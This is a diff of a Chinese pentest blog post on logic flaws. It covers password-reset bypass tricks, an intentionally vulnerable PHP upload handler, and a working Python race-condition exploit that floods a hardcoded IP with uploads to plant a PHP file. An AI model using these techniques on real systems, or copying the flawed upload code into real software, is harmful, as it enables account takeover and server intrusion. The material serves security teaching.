@@ -1,293 +1,136 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content=""/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>逻辑漏洞 | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>逻辑漏洞</h1>
-      
-<div class="post-meta">
-    <time>2016-07-31</time>
-    
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E">逻辑漏洞</a>)
-</div>
-
-      <div><h3 id="0x00-逻辑漏洞">0x00 逻辑漏洞</h3>
-<p>逻辑漏洞是一种业务逻辑上的设计缺陷，业务流存在问题。
-这里说一下密码找回漏洞、多线程条件竞争漏洞和支付漏洞。</p>
-<h3 id="0x01-密码找回漏洞">0x01 密码找回漏洞</h3>
-<ul>
-<li>
-<p>测试流程</p>
-<ul>
-<li>先尝试正确的密码找回流程，记录不同找回方式的所有数据包</li>
-<li>分析数据包，找到有效数据部分</li>
-<li>推测数据构造方法</li>
-<li>构造数据包验证猜测</li>
-</ul>
-</li>
-<li>
-<p>分类</p>
-<ul>
-<li>邮箱找回</li>
-</ul>
-<pre tabindex="0"><code>一般是点击邮件中的链接后会转跳到修改密码的页面，需要分析链接的token构造，可以考虑是时间戳md5、用户名或邮箱和随机字符串md5等，一般是类似如下链接：
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=author content="Reber"><title>逻辑漏洞 | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>逻辑漏洞</h1><div class=post-meta><time>2016-07-31</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E>逻辑漏洞</a>)</div><div><h3 id=0x00-逻辑漏洞>0x00 逻辑漏洞</h3><p>逻辑漏洞是一种业务逻辑上的设计缺陷，业务流存在问题。
+这里说一下密码找回漏洞、多线程条件竞争漏洞和支付漏洞。</p><h3 id=0x01-密码找回漏洞>0x01 密码找回漏洞</h3><ul><li><p>测试流程</p><ul><li>先尝试正确的密码找回流程，记录不同找回方式的所有数据包</li><li>分析数据包，找到有效数据部分</li><li>推测数据构造方法</li><li>构造数据包验证猜测</li></ul></li><li><p>分类</p><ul><li>邮箱找回</li></ul><pre tabindex=0><code>一般是点击邮件中的链接后会转跳到修改密码的页面，需要分析链接的token构造，可以考虑是时间戳md5、用户名或邮箱和随机字符串md5等，一般是类似如下链接：
 http://domain/findpwd.php?u=xiaoming&amp;token=MTIzQHFxLmNvbQ==
 http://domain/findpwd.php?id=374&amp;token=2ad64bf14c714dbce88c7993663da7da
 当构造相应链接时就可以重置任意用户的密码
-</code></pre><ul>
-<li>手机短信找回</li>
-</ul>
-<pre tabindex="0"><code>短信找回一般就是4位或6位验证码，暴力猜测吧
-</code></pre><ul>
-<li>找回逻辑错误</li>
-</ul>
-<pre tabindex="0"><code>若恶意用户A用15123333333找回密码，此时收到验证码但不使用
+</code></pre><ul><li>手机短信找回</li></ul><pre tabindex=0><code>短信找回一般就是4位或6位验证码，暴力猜测吧
+</code></pre><ul><li>找回逻辑错误</li></ul><pre tabindex=0><code>若恶意用户A用15123333333找回密码，此时收到验证码但不使用
 此时恶意用户A再用受害者B的手机号找回密码
 用户A在B的验证表单填入自己收到的验证码，发送
 此时跳转的修改密码页面修改的就是用户B的密码
-</code></pre><ul>
-<li>直接修改密码</li>
-</ul>
-<pre tabindex="0"><code>在修改密码时跳过选择找回方式，直接访问修改密码的页面进行修改
-</code></pre><ul>
-<li>本地验证</li>
-</ul>
-<pre tabindex="0"><code>随意输入一个验证码，开Burp抓包，forward，抓返回包，返回包里可能有一个flag字段，
+</code></pre><ul><li>直接修改密码</li></ul><pre tabindex=0><code>在修改密码时跳过选择找回方式，直接访问修改密码的页面进行修改
+</code></pre><ul><li>本地验证</li></ul><pre tabindex=0><code>随意输入一个验证码，开Burp抓包，forward，抓返回包，返回包里可能有一个flag字段，
 若flag的值为1则跳转到修改密码页面，所以只要修改返回包即可
-</code></pre><ul>
-<li>服务端将验证码返回给浏览器</li>
-</ul>
-<pre tabindex="0"><code>在点击获取验证码时，服务器会将验证码发送给浏览器，抓包即可
-</code></pre><ul>
-<li>验证码直接出现在url中</li>
-</ul>
-<pre tabindex="0"><code>当点击获取验证码时发出的请求链接中直接有code
-</code></pre><ul>
-<li>密保问题找回</li>
-</ul>
-<pre tabindex="0"><code>回答密保问题，有时一些答案就在html源码里
-</code></pre></li>
-</ul>
-<h3 id="0x02-多线程条件竞争漏洞">0x02 多线程条件竞争漏洞</h3>
-<p>多线程条件竞争漏洞是一种服务端的漏洞，服务端是并发处理用户请求的，若并发处理不当或相关操作逻辑设计有缺陷时就会产生一些安全问题。</p>
-<ul>
-<li>文件上传</li>
-</ul>
-<p>服务端可以sudo apt-get install inotify-tools安装监听文件的软件，执行inotifywait -m /var/www/html/admin监听admin文件夹中文件的变化</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">//uploads.php代码如下，仅供测试：
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;utf-8&#39;</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span>    $allowtype <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;gif&#34;</span>,<span style="color:#e6db74">&#34;png&#34;</span>,<span style="color:#e6db74">&#34;jpg&#34;</span>);
-</span></span><span style="display:flex;"><span>    $size <span style="color:#f92672">=</span> <span style="color:#ae81ff">10000000</span>;
-</span></span><span style="display:flex;"><span>    $path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./uploads/&#34;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    $filename <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#39;myfile&#39;</span>][<span style="color:#e6db74">&#39;name&#39;</span>];
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">is_uploaded_file</span>($_FILES[<span style="color:#e6db74">&#39;myfile&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>])){
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">move_uploaded_file</span>($_FILES[<span style="color:#e6db74">&#39;myfile&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>],$path<span style="color:#f92672">.</span>$filename)){
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;error:can not move!&#34;</span>);
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;error:not an upload file！&#34;</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;file upload success.file path is: &#34;</span><span style="color:#f92672">.</span>$path<span style="color:#f92672">.</span>$newfile<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;br /&gt;&#34;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($_FILES[<span style="color:#e6db74">&#39;myfile&#39;</span>][<span style="color:#e6db74">&#39;error&#39;</span>]<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>){
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">unlink</span>($path<span style="color:#f92672">.</span>$newfile);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Upload file error: &#34;</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    $ext <span style="color:#f92672">=</span> <span style="color:#a6e22e">array_pop</span>(<span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34;.&#34;</span>,$_FILES[<span style="color:#e6db74">&#39;myfile&#39;</span>][<span style="color:#e6db74">&#39;name&#39;</span>]));
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">in_array</span>($ext,$allowtype)){
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">unlink</span>($path<span style="color:#f92672">.</span>$newfile);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;error:upload the file type is not allowed，delete the file！&#34;</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><ul>
-<li>简单利用代码如下：</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#-*- coding:utf-8 -*-</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> threading
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">200个线程上传文件aa.php，同时200个线程同时请求aa.php，aa.php中内容为
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;?php fputs(fopen(&#34;info.php&#34;,&#34;w&#34;),&#34;&lt;?php phpinfo(); ?&gt;&#34;) ?&gt;，
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">只要aa.php被请求成功就会生成内容为&lt;?php phpinfo(); ?&gt;的php文件info.php
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>is_exit <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_info</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> is_exit
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#f92672">not</span> is_exit:
-</span></span><span style="display:flex;"><span>        url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://123.206.78.220/uploads/aa.php&#34;</span>
-</span></span><span style="display:flex;"><span>        resp <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">put_file</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> is_exit
-</span></span><span style="display:flex;"><span>    file <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;myfile&#39;</span>:(<span style="color:#e6db74">&#39;aa.php&#39;</span>,open(<span style="color:#e6db74">&#39;C:/Users/Administrator/Desktop/aa.php&#39;</span>),<span style="color:#e6db74">&#39;application/octet-stream&#39;</span>)}
-</span></span><span style="display:flex;"><span>    upload_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://123.206.78.220/uploads.php&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>  <span style="color:#f92672">not</span> is_exit:
-</span></span><span style="display:flex;"><span>        requests<span style="color:#f92672">.</span>post(upload_url,files<span style="color:#f92672">=</span>file)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check_info</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> is_exit
-</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;start threading check info.php:&#34;</span>
-</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://123.206.78.220/uploads/info.php&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
-</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;check info.php...&#34;</span>
-</span></span><span style="display:flex;"><span>        resp <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> resp<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
-</span></span><span style="display:flex;"><span>            is_exit <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
-</span></span><span style="display:flex;"><span>            print <span style="color:#e6db74">&#34;create file info.php success.&#34;</span>
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">200</span>):
-</span></span><span style="display:flex;"><span>    t <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>create_info)
-</span></span><span style="display:flex;"><span>    t<span style="color:#f92672">.</span>setDaemon(<span style="color:#66d9ef">True</span>)
-</span></span><span style="display:flex;"><span>    t<span style="color:#f92672">.</span>start()
-</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;start create_into threading </span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> x
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">200</span>):
-</span></span><span style="display:flex;"><span>    t <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>put_file)
-</span></span><span style="display:flex;"><span>    t<span style="color:#f92672">.</span>setDaemon(<span style="color:#66d9ef">True</span>)
-</span></span><span style="display:flex;"><span>    t<span style="color:#f92672">.</span>start()
-</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;start put_file threading </span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> x
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>t <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>check_info)
-</span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>setDaemon(<span style="color:#66d9ef">True</span>)
-</span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>start()
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> t<span style="color:#f92672">.</span>isAlive():
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
-</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyboardInterrupt</span>:
-</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#39;stopped by keyboard&#39;</span>
-</span></span></code></pre></div><ul>
-<li>数据库操作</li>
-</ul>
-<p>在数据库进行update、delete等操作时使用多线程请求，可在一次update时间内完成多次update，和上面的文件上传其实是一个原理</p>
-<h3 id="0x03-支付漏洞">0x03 支付漏洞</h3>
-<pre tabindex="0"><code>攻击者通过修改交易金额、交易数量等从而利用漏洞，
+</code></pre><ul><li>服务端将验证码返回给浏览器</li></ul><pre tabindex=0><code>在点击获取验证码时，服务器会将验证码发送给浏览器，抓包即可
+</code></pre><ul><li>验证码直接出现在url中</li></ul><pre tabindex=0><code>当点击获取验证码时发出的请求链接中直接有code
+</code></pre><ul><li>密保问题找回</li></ul><pre tabindex=0><code>回答密保问题，有时一些答案就在html源码里
+</code></pre></li></ul><h3 id=0x02-多线程条件竞争漏洞>0x02 多线程条件竞争漏洞</h3><p>多线程条件竞争漏洞是一种服务端的漏洞，服务端是并发处理用户请求的，若并发处理不当或相关操作逻辑设计有缺陷时就会产生一些安全问题。</p><ul><li>文件上传</li></ul><p>服务端可以sudo apt-get install inotify-tools安装监听文件的软件，执行inotifywait -m /var/www/html/admin监听admin文件夹中文件的变化</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e>//uploads.php代码如下，仅供测试：
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>meta</span> <span style=color:#a6e22e>charset</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;utf-8&#39;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span>    $allowtype <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#34;gif&#34;</span>,<span style=color:#e6db74>&#34;png&#34;</span>,<span style=color:#e6db74>&#34;jpg&#34;</span>);
+</span></span><span style=display:flex><span>    $size <span style=color:#f92672>=</span> <span style=color:#ae81ff>10000000</span>;
+</span></span><span style=display:flex><span>    $path <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;./uploads/&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    $filename <span style=color:#f92672>=</span> $_FILES[<span style=color:#e6db74>&#39;myfile&#39;</span>][<span style=color:#e6db74>&#39;name&#39;</span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>is_uploaded_file</span>($_FILES[<span style=color:#e6db74>&#39;myfile&#39;</span>][<span style=color:#e6db74>&#39;tmp_name&#39;</span>])){
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>move_uploaded_file</span>($_FILES[<span style=color:#e6db74>&#39;myfile&#39;</span>][<span style=color:#e6db74>&#39;tmp_name&#39;</span>],$path<span style=color:#f92672>.</span>$filename)){
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;error:can not move!&#34;</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;error:not an upload file！&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;file upload success.file path is: &#34;</span><span style=color:#f92672>.</span>$path<span style=color:#f92672>.</span>$newfile<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&lt;br /&gt;&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ($_FILES[<span style=color:#e6db74>&#39;myfile&#39;</span>][<span style=color:#e6db74>&#39;error&#39;</span>]<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>0</span>){
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>unlink</span>($path<span style=color:#f92672>.</span>$newfile);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Upload file error: &#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    $ext <span style=color:#f92672>=</span> <span style=color:#a6e22e>array_pop</span>(<span style=color:#a6e22e>explode</span>(<span style=color:#e6db74>&#34;.&#34;</span>,$_FILES[<span style=color:#e6db74>&#39;myfile&#39;</span>][<span style=color:#e6db74>&#39;name&#39;</span>]));
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>in_array</span>($ext,$allowtype)){
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>unlink</span>($path<span style=color:#f92672>.</span>$newfile);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;error:upload the file type is not allowed，delete the file！&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></span></span></code></pre></div><ul><li>简单利用代码如下：</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#-*- coding:utf-8 -*-</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> threading
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> time
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>200个线程上传文件aa.php，同时200个线程同时请求aa.php，aa.php中内容为
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;?php fputs(fopen(&#34;info.php&#34;,&#34;w&#34;),&#34;&lt;?php phpinfo(); ?&gt;&#34;) ?&gt;，
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>只要aa.php被请求成功就会生成内容为&lt;?php phpinfo(); ?&gt;的php文件info.php
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>is_exit <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>create_info</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>global</span> is_exit
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> <span style=color:#f92672>not</span> is_exit:
+</span></span><span style=display:flex><span>        url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://123.206.78.220/uploads/aa.php&#34;</span>
+</span></span><span style=display:flex><span>        resp <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>put_file</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>global</span> is_exit
+</span></span><span style=display:flex><span>    file <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;myfile&#39;</span>:(<span style=color:#e6db74>&#39;aa.php&#39;</span>,open(<span style=color:#e6db74>&#39;C:/Users/Administrator/Desktop/aa.php&#39;</span>),<span style=color:#e6db74>&#39;application/octet-stream&#39;</span>)}
+</span></span><span style=display:flex><span>    upload_url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://123.206.78.220/uploads.php&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span>  <span style=color:#f92672>not</span> is_exit:
+</span></span><span style=display:flex><span>        requests<span style=color:#f92672>.</span>post(upload_url,files<span style=color:#f92672>=</span>file)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>check_info</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>global</span> is_exit
+</span></span><span style=display:flex><span>    print <span style=color:#e6db74>&#34;start threading check info.php:&#34;</span>
+</span></span><span style=display:flex><span>    url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://123.206.78.220/uploads/info.php&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
+</span></span><span style=display:flex><span>        print <span style=color:#e6db74>&#34;check info.php...&#34;</span>
+</span></span><span style=display:flex><span>        resp <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> resp<span style=color:#f92672>.</span>status_code <span style=color:#f92672>==</span> <span style=color:#ae81ff>200</span>:
+</span></span><span style=display:flex><span>            is_exit <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
+</span></span><span style=display:flex><span>            print <span style=color:#e6db74>&#34;create file info.php success.&#34;</span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> xrange(<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>200</span>):
+</span></span><span style=display:flex><span>    t <span style=color:#f92672>=</span> threading<span style=color:#f92672>.</span>Thread(target<span style=color:#f92672>=</span>create_info)
+</span></span><span style=display:flex><span>    t<span style=color:#f92672>.</span>setDaemon(<span style=color:#66d9ef>True</span>)
+</span></span><span style=display:flex><span>    t<span style=color:#f92672>.</span>start()
+</span></span><span style=display:flex><span>    print <span style=color:#e6db74>&#34;start create_into threading </span><span style=color:#e6db74>%d</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> x
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> xrange(<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>200</span>):
+</span></span><span style=display:flex><span>    t <span style=color:#f92672>=</span> threading<span style=color:#f92672>.</span>Thread(target<span style=color:#f92672>=</span>put_file)
+</span></span><span style=display:flex><span>    t<span style=color:#f92672>.</span>setDaemon(<span style=color:#66d9ef>True</span>)
+</span></span><span style=display:flex><span>    t<span style=color:#f92672>.</span>start()
+</span></span><span style=display:flex><span>    print <span style=color:#e6db74>&#34;start put_file threading </span><span style=color:#e6db74>%d</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> x
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
